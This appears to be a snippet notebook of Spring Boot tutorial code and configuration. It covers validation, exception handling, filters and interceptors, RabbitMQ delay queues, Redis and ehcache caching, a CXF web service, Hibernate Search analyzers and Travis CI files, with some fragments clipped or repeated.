      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "price", "NotEmpty.productForm.price");
 
      String code = productForm.getCode();
      if (code != null && code.length() > 0) {
         if (code.matches("\\s+")) {
            errors.rejectValue("code", "Pattern.productForm.code");
         } else if (productForm.isNewProduct()) {
            Product product = productDAO.findProduct(code);
            if (product != null) {
               errors.rejectValue("code", "Duplicate.productForm.code");
            }
         }
      }
   }
}

   @Autowired
   private ProductFormValidator productFormValidator;
 
   @InitBinder
   public void myInitBinder(WebDataBinder dataBinder) {
      Object target = dataBinder.getTarget();
      if (target == null) {
         return;
      }
      System.out.println("Target=" + target);
 
      if (target.getClass() == ProductForm.class) {
         dataBinder.setValidator(productFormValidator);
      }
   }
   
 
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;
 
public class ServletInitializer extends SpringBootServletInitializer {
 
    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(SpringBootTomcatApplication.class);
    }
 
}
--------------------------------------------------------------------------------------------------------
logging.config
logging.exception-conversion-word
logging.file
logging.level.*
logging.path
logging.pattern.console
logging.pattern.file
logging.pattern.level
logging.register-shutdown-hook

yyyy-MM-dd'T'HH:mm:ss.SSSZ
--------------------------------------------------------------------------------------------------------
curl -i -H "key1:val1" -H "key2:val2" http://localhost:8080/spring-rest/ex/foos
@RequestMapping(value = "/ex/bars/{numericId:[\\d]+}", method = GET)
curl -i -d id=100 http://localhost:8080/spring-rest/ex/bars
--------------------------------------------------------------------------------------------------------
@RequestParam Map<String, String> params
   /*
    * Binding date and time URL template variable to LocalDate and LocalTime
    */
   @GetMapping("/request5/{date}/{time}")
   @ResponseBody
   public String handler(
         @DateTimeFormat(pattern = "yyyy-MM-dd") @PathVariable("date") LocalDate date,
         @DateTimeFormat(pattern = "HH:mm:ss") @PathVariable("time") LocalTime time) {

      return "URL parameters - <br>" 
            + " date = " + date + " <br>" 
            + " time = " + time;
   }
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;

import org.springframework.validation.BindException;
import org.springframework.validation.FieldError;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.ResponseBody;

import lombok.extern.slf4j.Slf4j;

/**
 *  统一异常处理类
 * @author oKong
 *
 */
@ControllerAdvice
@Slf4j
public class CommonExceptionHandler {

	/**
	 * 拦截 CommonException 的异常
	 * @param ex
	 * @return
	 */
	@ExceptionHandler(CommonException.class)
	@ResponseBody
	public Map<String,Object> exceptionHandler(CommonException ex){
		log.info("CommonException：{}({})",ex.getMsg(), ex.getCode());
		Map<String,Object> result = new HashMap<String,Object>();
		result.put("respCode", ex.getCode());
		result.put("respMsg", ex.getMsg());
		return result; 
	}
	
	/**
	 *  拦截Exception类的异常
	 * @param e
	 * @return
	 */
	@ExceptionHandler(Exception.class)
	@ResponseBody
	public Map<String,Object> exceptionHandler(Exception e){
		log.info("Exception：{}({})",e);
		Map<String,Object> result = new HashMap<String,Object>();
		result.put("respCode", "9999");
		result.put("respMsg", e.getMessage());
		//正常开发中，可创建一个统一响应实体，如CommonResp
		return result; 
	}
	
	@ExceptionHandler(MethodArgumentNotValidException.class)
	@ResponseBody
	public Map<String,Object> handleBindException(MethodArgumentNotValidException ex) {
		FieldError fieldError = ex.getBindingResult().getFieldError();
		log.info("参数校验异常:{}({})", fieldError.getDefaultMessage(),fieldError.getField());
		Map<String,Object> result = new HashMap<String,Object>();
		result.put("respCode", "01002");
		result.put("respMsg", fieldError.getDefaultMessage());
		return result;
	}


	@ExceptionHandler(BindException.class)
	@ResponseBody
	public Map<String,Object> handleBindException(BindException ex) {
		//校验 除了 requestbody 注解方式的参数校验 对应的 bindingresult 为 BeanPropertyBindingResult
		FieldError fieldError = ex.getBindingResult().getFieldError();
		log.info("必填校验异常:{}({})", fieldError.getDefaultMessage(),fieldError.getField());
		Map<String,Object> result = new HashMap<String,Object>();
		result.put("respCode", "01002");
		result.put("respMsg", fieldError.getDefaultMessage());
		return result;
	}
}
--------------------------------------------------------------------------------------------------------
import javax.servlet.Filter;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.boot.web.servlet.ServletComponentScan;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

import cn.lqdev.learning.chapter7.config.CustomFilter;
import cn.lqdev.learning.chapter7.config.CustomHandlerInterceptor;
import lombok.extern.slf4j.Slf4j;

/**
 * 
 *  拦截器、监听器、过滤器的使用
 *  启动类
 * @author oKong
 *
 */
@SpringBootApplication
@ServletComponentScan
@Slf4j
public class Chapter7Application {
	
	public static void main(String[] args) {
		SpringApplication.run(Chapter7Application.class, args);
		log.info("chapter7 服务启动");
	}
	
	@Bean
	public FilterRegistrationBean  filterRegistrationBean() {
        FilterRegistrationBean registration = new FilterRegistrationBean();
        //当过滤器有注入其他bean类时，可直接通过@bean的方式进行实体类过滤器，这样不可自动注入过滤器使用的其他bean类。
        //当然，若无其他bean需要获取时，可直接new CustomFilter()，也可使用getBean的方式。
        registration.setFilter(customFilter());
        //过滤器名称
        registration.setName("customFilter");
        //拦截路径
        registration.addUrlPatterns("/*");
        //设置顺序
        registration.setOrder(10);
		return registration;
	}

	@Bean
	public Filter customFilter() {
		return new CustomFilter();
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

/**
 * 
 * @author oKong
 *
 */
@Configuration
public class WebMvcConfigurer extends WebMvcConfigurerAdapter{
	
	@Override
	 public void addInterceptors(InterceptorRegistry registry) {
		 //注册拦截器 拦截规则
		//多个拦截器时 以此添加 执行顺序按添加顺序
		registry.addInterceptor(getHandlerInterceptor()).addPathPatterns("/*");
	 }
	
	@Bean
	public static HandlerInterceptor getHandlerInterceptor() {
		return new CustomHandlerInterceptor();
	}
}

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.annotation.WebListener;

import lombok.extern.slf4j.Slf4j;


@WebListener
@Slf4j
public class CustomLister implements ServletContextListener{
	
	@Override
	public void contextInitialized(ServletContextEvent sce) {
		log.info("监听器：初始化");
	}

	@Override
	public void contextDestroyed(ServletContextEvent sce) {
		log.info("监听器：销毁");
	}

	
}

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import lombok.extern.slf4j.Slf4j;

/**
 * 
 * @author oKong
 *
 */
@Slf4j
public class CustomHandlerInterceptor implements HandlerInterceptor{

	@Override
	public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)
			throws Exception {
		log.info("preHandle:请求前调用");
		//返回 false 则请求中断
		return true;
	}

	@Override
	public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler,
			ModelAndView modelAndView) throws Exception {
		log.info("postHandle:请求后调用");

	}

	@Override
	public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)
			throws Exception {
		log.info("afterCompletion:请求调用完成后回调方法，即在视图渲染完成后回调");

	}

}

import java.io.IOException;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

import lombok.extern.slf4j.Slf4j;

/**
 *  自定义过滤器
 * 
 * @author oKong
 *
 */
//注册器名称为customFilter,拦截的url为所有
//@WebFilter(filterName="customFilter",urlPatterns={"/*"})
@Slf4j
public class CustomFilter implements Filter{

	@Override
	public void init(FilterConfig filterConfig) throws ServletException {
		log.info("filter 初始化");
	}

	@Override
	public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
			throws IOException, ServletException {
		// TODO Auto-generated method stub
		log.info("doFilter 请求处理");
		//对request、response进行一些预处理
		// 比如设置请求编码
		// request.setCharacterEncoding("UTF-8");
        // response.setCharacterEncoding("UTF-8");
		//TODO 进行业务逻辑
		
		//链路 直接传给下一个过滤器
		chain.doFilter(request, response);
	}

	@Override
	public void destroy() {
		log.info("filter 销毁");
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.amqp.core.AmqpTemplate;
import org.springframework.amqp.rabbit.config.SimpleRabbitListenerContainerFactory;
import org.springframework.amqp.rabbit.listener.RabbitListenerEndpointRegistry;
import org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import cn.lqdev.learning.springboot.chapter38.constant.ApplicationConstant;
import cn.lqdev.learning.springboot.chapter38.entity.HttpEntity;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;

/** 
*
* @ClassName   类名：HttpDemoController 
* @Description 功能说明：
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年7月17日
* @author      创建人：xds
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年7月17日   xds   创建该类功能。
*
***********************************************************************
*</p>
*/
@Slf4j

--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.service.Contact;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

@EnableSwagger2
@Configuration
public class SwaggerConfig {

	//是否开启swagger，正式环境一般是需要关闭的，可根据springboot的多环境配置进行设置
	@Value(value = "${swagger.enabled}")
	Boolean swaggerEnabled;

	@Bean
	public Docket createRestApi() {
		return new Docket(DocumentationType.SWAGGER_2).apiInfo(apiInfo())
				// 是否开启
				.enable(swaggerEnabled).select()
				// 扫描的路径包
				.apis(RequestHandlerSelectors.basePackage("cn.lqdev.learning.springboot.chapter38"))
				// 指定路径处理PathSelectors.any()代表所有的路径
				.paths(PathSelectors.any()).build().pathMapping("/");
	}

	//设置api信息
	private ApiInfo apiInfo() {
		return new ApiInfoBuilder()
				.title("SpringBoot-rabbitMQ延迟队列-demo示例")
				.description("oKong | 趔趄的猿")
				// 作者信息
				.contact(new Contact("oKong", "https://blog.lqdev.cn/", "499452441@qq.com"))
				.version("1.0.0")
				.build();
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.amqp.core.AcknowledgeMode;
import org.springframework.amqp.core.Binding;
import org.springframework.amqp.core.BindingBuilder;
import org.springframework.amqp.core.DirectExchange;
import org.springframework.amqp.core.Queue;
import org.springframework.amqp.core.QueueBuilder;
import org.springframework.amqp.rabbit.config.SimpleRabbitListenerContainerFactory;
import org.springframework.amqp.rabbit.connection.ConnectionFactory;
import org.springframework.amqp.rabbit.core.RabbitAdmin;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import cn.lqdev.learning.springboot.chapter38.constant.ApplicationConstant;

/** 
*
* @ClassName   类名：RabbitConfig 
* @Description 功能说明：
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年7月17日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年7月17日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
@Configuration
public class RabbitConfig {
	
	@Autowired
	ConnectionFactory connectionFactory;
	
	/**
	 * 消费者线程数 设置大点 大概率是能通知到的
	 */
	@Value("${http.notify.concurrency:50}")
	int concurrency;
	
	/**
	 * 延迟队列的消费者线程数 可设置小点
	 */
	@Value("${http.notify.delay.concurrency:20}")
	int delayConcurrency;
	
	@Bean
	public RabbitAdmin rabbitAdmin() {
		return new RabbitAdmin(connectionFactory);
	}
	
	@Bean
	public DirectExchange httpMessageNotifyDirectExchange(RabbitAdmin rabbitAdmin) {
		//durable 是否持久化
		//autoDelete 是否自动删除，即服务端或者客服端下线后 交换机自动删除
		DirectExchange directExchange = new DirectExchange(ApplicationConstant.HTTP_MESSAGE_EXCHANGE,true,false);
		directExchange.setAdminsThatShouldDeclare(rabbitAdmin);
		return directExchange;
	}
	
	//设置消息队列
	@Bean
	public Queue httpMessageStartQueue(RabbitAdmin rabbitAdmin) {
		 
       /*
                       创建接收队列，4个参数
		 name - 队列名称
		 durable - false，不进行持有化
		 exclusive - true，独占性
		 autoDelete - true，自动删除*/
		Queue queue = new Queue(ApplicationConstant.HTTP_MESSAGE_START_QUEUE_NAME, true, false, false);
		queue.setAdminsThatShouldDeclare(rabbitAdmin);
		return queue;
	}
	
    //队列绑定交换机
	@Bean
	public Binding bindingStartQuene(RabbitAdmin rabbitAdmin,DirectExchange httpMessageNotifyDirectExchange, Queue httpMessageStartQueue) {
		Binding binding = BindingBuilder.bind(httpMessageStartQueue).to(httpMessageNotifyDirectExchange).with(ApplicationConstant.HTTP_MESSAGE_START_RK);
		binding.setAdminsThatShouldDeclare(rabbitAdmin);
		return binding;
	}
	
	@Bean
	public Queue httpMessageOneQueue(RabbitAdmin rabbitAdmin) {
		Queue queue = new Queue(ApplicationConstant.HTTP_MESSAGE_ONE_QUEUE_NAME, true, false, false);
		queue.setAdminsThatShouldDeclare(rabbitAdmin);
		return queue;
	}
	
	@Bean
	public Binding bindingOneQuene(RabbitAdmin rabbitAdmin,DirectExchange httpMessageNotifyDirectExchange, Queue httpMessageOneQueue) {
		Binding binding = BindingBuilder.bind(httpMessageOneQueue).to(httpMessageNotifyDirectExchange).with(ApplicationConstant.HTTP_MESSAGE_ONE_RK);
		binding.setAdminsThatShouldDeclare(rabbitAdmin);
		return binding;
	}
	
	//-------------设置延迟队列--开始--------------------
	@Bean
	public Queue httpDelayOneQueue() {
		//name - 队列名称
		//durable - true
		//exclusive - false
		//autoDelete - false
		return QueueBuilder.durable("http.message.dlx.one")
				//以下是重点：当变成死信队列时，会转发至 路由为x-dead-letter-exchange及x-dead-letter-routing-key的队列中
				.withArgument("x-dead-letter-exchange", ApplicationConstant.HTTP_MESSAGE_EXCHANGE)
				.withArgument("x-dead-letter-routing-key", ApplicationConstant.HTTP_MESSAGE_ONE_RK)
				.withArgument("x-message-ttl", 1*60*1000)//1分钟 过期时间（单位：毫秒），当过期后 会变成死信队列，之后进行转发
				.build();
	}
	//绑定到交换机上
	@Bean
	public Binding bindingDelayOneQuene(RabbitAdmin rabbitAdmin, DirectExchange httpMessageNotifyDirectExchange, Queue httpDelayOneQueue) {
		Binding binding = BindingBuilder.bind(httpDelayOneQueue).to(httpMessageNotifyDirectExchange).with("delay.one");
		binding.setAdminsThatShouldDeclare(rabbitAdmin);
		return binding;
	}
	//-------------设置延迟队列--结束--------------------

	//建议将正常的队列和延迟处理的队列分开
	//设置监听容器
	@Bean("notifyListenerContainer")
	public SimpleRabbitListenerContainerFactory httpNotifyListenerContainer() {
		SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory();
		factory.setAcknowledgeMode(AcknowledgeMode.MANUAL);// 手动ack
		factory.setConnectionFactory(connectionFactory);
		factory.setPrefetchCount(1);
		factory.setConcurrentConsumers(concurrency);
		return factory;
	}

	// 设置监听容器
	@Bean("delayNotifyListenerContainer")
	public SimpleRabbitListenerContainerFactory httpDelayNotifyListenerContainer() {
		SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory();
		factory.setAcknowledgeMode(AcknowledgeMode.MANUAL);// 手动ack
		factory.setConnectionFactory(connectionFactory);
		factory.setPrefetchCount(1);
		factory.setConcurrentConsumers(delayConcurrency);
		return factory;
	}
}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<ehcache xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:noNamespaceSchemaLocation="ehcache.xsd">
    <!--timeToIdleSeconds 当缓存闲置n秒后销毁 -->
    <!--timeToLiveSeconds 当缓存存活n秒后销毁 -->
    <!-- 缓存配置 
        name:缓存名称。 
        maxElementsInMemory：缓存最大个数。 
        eternal:对象是否永久有效，一但设置了，timeout将不起作用。 
        timeToIdleSeconds：设置对象在失效前的允许闲置时间（单位：秒）。仅当eternal=false对象不是永久有效时使用，可选属性，默认值是0，也就是可闲置时间无穷大。 
        timeToLiveSeconds：设置对象在失效前允许存活时间（单位：秒）。最大时间介于创建时间和失效时间之间。仅当eternal=false对象不是永久有效时使用，默认是0.，也就是对象存活时间无穷大。 
        overflowToDisk：当内存中对象数量达到maxElementsInMemory时，Ehcache将会对象写到磁盘中。 diskSpoolBufferSizeMB：这个参数设置DiskStore（磁盘缓存）的缓存区大小。默认是30MB。每个Cache都应该有自己的一个缓冲区。 
        maxElementsOnDisk：硬盘最大缓存个数。 
        diskPersistent：是否缓存虚拟机重启期数据 Whether the disk 
        store persists between restarts of the Virtual Machine. The default value 
        is false. 
        diskExpiryThreadIntervalSeconds：磁盘失效线程运行时间间隔，默认是120秒。  memoryStoreEvictionPolicy：当达到maxElementsInMemory限制时，Ehcache将会根据指定的策略去清理内存。默认策略是 
LRU（最近最少使用）。你可以设置为FIFO（先进先出）或是LFU（较少使用）。 
        clearOnFlush：内存数量最大时是否清除。 -->
    <!-- 磁盘缓存位置 -->
    <diskStore path="java.io.tmpdir" />
    <!-- 默认缓存 -->
    <defaultCache 
        maxElementsInMemory="10000" 
        eternal="false"
        timeToIdleSeconds="120" 
        timeToLiveSeconds="120" 
        maxElementsOnDisk="10000000"
        diskExpiryThreadIntervalSeconds="120" 
        memoryStoreEvictionPolicy="LRU">
        <persistence strategy="localTempSwap" />
    </defaultCache>

    <!-- 指定cache，即对应cacheName的值 -->
    <cache name="oKongCache" 
        eternal="false" 
        timeToIdleSeconds="2400"
        timeToLiveSeconds="2400" 
        maxEntriesLocalHeap="10000"
        maxEntriesLocalDisk="10000000" 
        diskExpiryThreadIntervalSeconds="120"
        overflowToDisk="false" 
        memoryStoreEvictionPolicy="LRU">
    </cache>
</ehcache>
--------------------------------------------------------------------------------------------------------
# REDIS (RedisProperties)
# Redis数据库索引（默认为0）
spring.redis.database=0
# Redis服务器地址
spring.redis.host=127.0.0.1
# Redis服务器连接端口
spring.redis.port=6379
# Redis服务器连接密码（默认为空）
spring.redis.password=
# 连接池最大连接数（使用负值表示没有限制）
spring.redis.pool.max-active=8
# 连接池最大阻塞等待时间（使用负值表示没有限制）
spring.redis.pool.max-wait=-1
# 连接池中的最大空闲连接
spring.redis.pool.max-idle=8
# 连接池中的最小空闲连接
spring.redis.pool.min-idle=0
# 连接超时时间（毫秒）
spring.redis.timeout=0

# ehcache配置地址
spring.cache.ehcache.config=ehcache.xml
--------------------------------------------------------------------------------------------------------
@RestController
@Slf4j
public class DemoController {
	
	@RequestMapping("/redis/{key}")
	@Cacheable(value = "redis",key="#key",cacheManager=CacheConfig.CacheManagerName.REDIS_CACHE_MANAGER)
	public String cacheRedisTest(@PathVariable("key") String key) {
		log.info("redis,key={}", key);
		return key;
	}
	
	@RequestMapping("/ehcache/{key}")
	@Cacheable(value = "oKongCache",key="#key",cacheManager=CacheConfig.CacheManagerName.EHCACHE_CACHE_MAANGER)
	public String cacheEhcacheTest(@PathVariable("key") String key) {
		log.info("ehcache,key={}", key);
		return key;
	}
	
	@RequestMapping("/default/{key}")
	@Cacheable(value = "default",key="#key")
	public String cacheDefaultTest(@PathVariable("key") String key) {
		log.info("default,key={}", key);
		return key;
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.ehcache.EhCacheCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;

import com.fasterxml.jackson.annotation.JsonAutoDetect;
import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.databind.ObjectMapper;

/** 
*
* @ClassName   类名：CacheConfig 
* @Description 功能说明：缓存配置类
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年3月7日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年3月7日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
@Configuration
@EnableCaching
public class CacheConfig {
	
	/**
     * cacheManager名称
     */
    public interface CacheManagerName {
        /**
         * redis
         */
        String REDIS_CACHE_MANAGER = "redisCacheManager";

        /**
         * ehCache
         */
        String EHCACHE_CACHE_MAANGER = "ehCacheCacheManager";
    }
	/**
     *  定义 StringRedisTemplate ，指定序列号和反序列化的处理类
     * @param factory
     * @return
     */
    @Bean
    public RedisTemplate<String, String> redisTemplate(RedisConnectionFactory factory) {
        StringRedisTemplate template = new StringRedisTemplate(factory);
        Jackson2JsonRedisSerializer<Object> jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer<>(
                Object.class);
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);
        //序列化 值时使用此序列化方法
        template.setValueSerializer(jackson2JsonRedisSerializer);
        template.afterPropertiesSet();
        return template;
    }
    
    @Bean(CacheConfig.CacheManagerName.REDIS_CACHE_MANAGER)
    @Primary
    public RedisCacheManager redisCacheManager(RedisTemplate<String,String> redisTemplate) {
        RedisCacheManager rcm = new RedisCacheManager(redisTemplate);
        //使用前缀
        rcm.setUsePrefix(true);
        //缓存分割符 默认为 ":"
//        rcm.setCachePrefix(new DefaultRedisCachePrefix(":"));
        //设置缓存过期时间
        //rcm.setDefaultExpiration(60);//秒
        return rcm;
    }
    
    @Bean(CacheConfig.CacheManagerName.EHCACHE_CACHE_MAANGER) 
    public EhCacheCacheManager EhcacheManager() {
    	EhCacheCacheManager ehCacheManager = new EhCacheCacheManager();
    	return ehCacheManager;
    }
    
//    @Bean(name = "cacheManager")
//    @Primary
//    public CompositeCacheManager cacheManager(RedisCacheManager redisCacheManager, EhCacheCacheManager ehCacheCacheManager) {
//        CompositeCacheManager cacheManager = new CompositeCacheManager(redisCacheManager, ehCacheCacheManager);
//        return cacheManager;
//    }
    
}
--------------------------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

import javax.jws.WebService;

import cn.lqdev.learning.springboot.cxf.config.WsConst;
import cn.lqdev.learning.springboot.cxf.entity.AuthorDto;
import cn.lqdev.learning.springboot.cxf.entity.Sex;


@WebService(
		 targetNamespace = WsConst.NAMESPACE_URI, //wsdl命名空间 
		 name = "authorPortType",                 //portType名称 客户端生成代码时 为接口名称
		 serviceName = "authorService",           //服务name名称
		 portName = "authorPortName",             //port名称
		 endpointInterface = "cn.lqdev.learning.springboot.cxf.service.AuthorService")//指定发布webservcie的接口类，此类也需要接入@WebService注解
public class AuthorServiceImpl implements AuthorService{

	@Override
	public AuthorDto getAuthor(String name) {
		AuthorDto author = new AuthorDto();
    	author.setBirthday("1990-01-23");
    	author.setName("姓名：" + name);
    	author.setSex(Sex.MALE);
    	author.setHobby(Arrays.asList("电影","旅游"));
    	author.setDescription("描述：一枚趔趄的猿。现在时间：" + new Date().getTime());
    	return author;
	}

	@Override
	public List<AuthorDto> getAuthorList() {
		List<AuthorDto> resultList = new ArrayList<>();
		AuthorDto author = new AuthorDto();
    	author.setBirthday("1990-01-23");
    	author.setName("姓名：oKong");
    	author.setSex(Sex.MALE);
    	author.setHobby(Arrays.asList("电影","旅游"));
    	author.setDescription("描述：一枚趔趄的猿。现在时间：" + new Date().getTime());
    	resultList.add(author);
    	resultList.add(author);
		return resultList;
	}

	@Override
	public String getAuthorString(String name) {
		AuthorDto author = getAuthor(name);
		return author.toString();
	}
}
--------------------------------------------------------------------------------------------------------
import java.util.List;

import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebService;

import cn.lqdev.learning.springboot.cxf.config.WsConst;
import cn.lqdev.learning.springboot.cxf.entity.AuthorDto;

/**
 * 创建服务接口
 * @author oKong
 *
 */
@WebService(targetNamespace = WsConst.NAMESPACE_URI ,name = "authorPortType")
public interface AuthorService {

	/**
	 * 根据名称获取作者信息
	 * @author 作者：oKong
	 */
	@WebMethod(operationName="getAuthorByName")
	AuthorDto getAuthor(@WebParam(name = "authorName") String name);

	/**
	 * 获取作者列表信息
	 * @author oKong
	 */
	@WebMethod
	List<AuthorDto> getAuthorList();
	
	/**
	 * 返回字符串测试
	 * @author oKong
	 */
	String getAuthorString(@WebParam(name = "authorName")String name);
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Configuration;
import org.springframework.context.event.EventListener;
import org.springframework.scheduling.annotation.Async;

import cn.lqdev.learning.springboot.chapter32.event.CustomEvent;
import cn.lqdev.learning.springboot.chapter32.event.MessageEntity;
import lombok.extern.slf4j.Slf4j;

/**
 * 监听配置类
 * 
 * @author oKong
 *
 */
@Configuration
@Slf4j
public class EventListenerConfig {

	@EventListener
	public void handleEvent(Object event) {
		//监听所有事件 可以看看 系统各类时间 发布了哪些事件
		//可根据 instanceof 监听想要监听的事件
//		if(event instanceof CustomEvent) {
//			
//		}
		log.info("事件：{}", event);
	}
	
	@EventListener
	public void handleCustomEvent(CustomEvent customEvent) {
		//监听 CustomEvent事件
		log.info("监听到CustomEvent事件，消息为：{}, 发布时间：{}", customEvent.getMessageEntity(), customEvent.getTimestamp());
	}
	
	/**
	 * 监听 code为oKong的事件
	 */
	@Async
	@EventListener(condition="#customEvent.messageEntity.code == 'oKong'")
	public void handleCustomEventByCondition(CustomEvent customEvent) {
		//监听 CustomEvent事件
		log.info("监听到code为'oKong'的CustomEvent事件，消息为：{}, 发布时间：{}", customEvent.getMessageEntity(), customEvent.getTimestamp());
	}
	
	@EventListener 
	public void handleObjectEvent(MessageEntity messageEntity) {
		//这个和eventbus post方法一样了
		log.info("监听到对象事件，消息为：{}", messageEntity);
		
	}
}
--------------------------------------------------------------------------------------------------------
    @Autowired
    private SessionService sessionService;

    @GetMapping("/created")
    public ResponseEntity init() {
        final Session session = new Session();
        session.setId("c108cda3-8b4b-483d-a987-d65e6bfe3024");
        session.setFilepath("C:\\git-project\\paragon.microservices.distributor");
        session.setFilename("lombok.config");
        this.sessionService.save(session);
        return ResponseEntity.ok().build();
    }
--------------------------------------------------------------------------------------------------------
@Entity

@Indexed

@AnalyzerDefs({

@AnalyzerDef(name = "en",

tokenizer = @TokenizerDef(factory = StandardTokenizerFactory.class),

filters = {

@TokenFilterDef(factory = LowerCaseFilterFactory.class),

@TokenFilterDef(factory = SnowballPorterFilterFactory.class, params = {

@Parameter(name = "language", value = "English")

})

}),

@AnalyzerDef(name = "de",

tokenizer = @TokenizerDef(factory = StandardTokenizerFactory.class),

filters = {

@TokenFilterDef(factory = LowerCaseFilterFactory.class),

@TokenFilterDef(factory = GermanStemFilterFactory.class)

})

})

public class Article {

private Integer id;

private String language;

private String text;

@Id @GeneratedValue

public Integer getId() {

return id;

}

public void setId(Integer id) {

this.id = id;

}

@Field(store = Store.YES)

@AnalyzerDiscriminator(impl = LanguageDiscriminator.class)

public String getLanguage() {

return language;

}

public void setLanguage(String language) {

this.language = language;

}

@Field(store = Store.YES)

public String getText() {

return text;

}

...

}

public class LanguageDiscriminator implements Discriminator {

@Override

public String getAnalyzerDefinitionName(Object value, Object entity, String field) {

if ( value == null || !( entity instanceof Article ) ) {

return null;

}
return (String) value;
}
}

@Field(store = Store.YES)

@AnalyzerDiscriminator(impl = LanguageDiscriminator.class)

public String getLanguage() {

return language;

}

public void setLanguage(String language) {

this.language = language;

}

@Field(store = Store.YES)

public String getText() {

return text;

}


--------------------------------------------------------------------------------------------------------
https://in.relation.to/

  - ./mvnw $BUILD_OPTIONS -B -q clean install javadoc:javadoc
    -DskipTests -Dmaven.javadoc.skip=true -Dcheckstyle.skip=true -Dforbiddenapis.skip=true -Djqassistant.skip=true
--------------------------------------------------------------------------------------------------------
language: java
jdk:
  - oraclejdk8
  - openjdk8
  - openjdk9
  - openjdk10
  - openjdk11
script: mvn clean verify

# The main CI of Hibernate Search is https://ci.hibernate.org/job/hibernate-search/. Travis CI can be
# used in github forks. https://travis-ci.org/hibernate/hibernate-search is
# therefore deactivated. Activating Travis for your own fork is as easy as
# activating it in the travis site of your fork.

dist: trusty
language: java
jdk:
  - oraclejdk8
cache:
  directories:
    - $HOME/.m2
env:
  global:
    # Unset _JAVA_OPTIONS to avoid raising the memory used by Elasticsearch
    # See https://hibernate.atlassian.net/browse/HSEARCH-3252
    - _JAVA_OPTIONS=
    # Ensure Maven doesn't eat up too much memory
    - MAVEN_OPTS=-Xmx756m
